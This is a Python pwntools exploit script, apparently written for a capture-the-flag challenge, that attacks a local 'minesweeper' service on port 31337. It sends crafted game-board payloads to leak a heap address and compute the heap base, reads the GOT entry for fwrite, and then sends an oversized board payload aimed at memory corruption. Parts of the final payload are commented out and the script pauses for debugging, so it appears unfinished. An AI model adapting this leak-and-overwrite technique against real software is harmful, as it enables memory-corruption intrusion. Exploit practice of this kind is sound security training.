import pwn as p


server = p.process('./minesweeper')
p.gdb.attach(server, gdbscript='set follow-fork-mode child')
target = p.remote("127.0.0.1", 31337)

elf = p.ELF('./minesweeper')


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b), end='')


def init_game(x, y, payload):
    target.sendline(b'I')
    prints(target.recvuntil(b'B X Y'))
    target.sendline(b(f'B {x} {y}'))
    prints(target.recvuntil(b'marked by the character X'))
    target.sendline(payload)


def get_leak():
    prints(target.recvuntil(b'3) Q (Quit)'))
    target.sendline(b'N')
    prints(target.recvuntil(b'3) Quit game (Q)'))
    target.sendline(b'V')
    for i in range(5):
        prints(target.recvline())
    raw_input = target.recvline().strip(b'\x0a')
    raw_input += b'\x00' * (4 - len(raw_input))
    leak = p.u32(raw_input)
    target.sendline(b'Q')
    return leak


payload = b'X'
for i in range(3*2):
    payload += bytes([49+i])
payload += b'0' * (12 - len(payload))

prints(target.recvuntil(b'3) Q (Quit)'))
init_game(4, 3, payload)
heap_leak = get_leak()
print('heap_leak:', hex(heap_leak))
heap_base = heap_leak - 0x3fc
# heap_base = heap_leak - 0x14
print('heap_base:', hex(heap_base))

x = 2
y = 2
for i in range(5):
    prints(target.recvuntil(b'3) Q (Quit)'))
    init_game(x, y, b'X' + b(str(i))*(x*y))


fwrite_got = elf.got['fwrite']
print('fwrite:', hex(fwrite_got))

x = 16
y = 13
prints(target.recvuntil(b'3) Q (Quit)'))
payload = b'X' + b'5'*(x*y)
# payload += p.p32(fwrite_got)
# payload += p.p32(heap_base)

input()
# payload += b'5'*(x*y-len(payload))
init_game(x, y, payload)

# x = 12
# y = 11
# prints(target.recvuntil(b'3) Q (Quit)'))
# init_game(x, y, b'X' + b'1'*(x*y+1))

target.interactive()
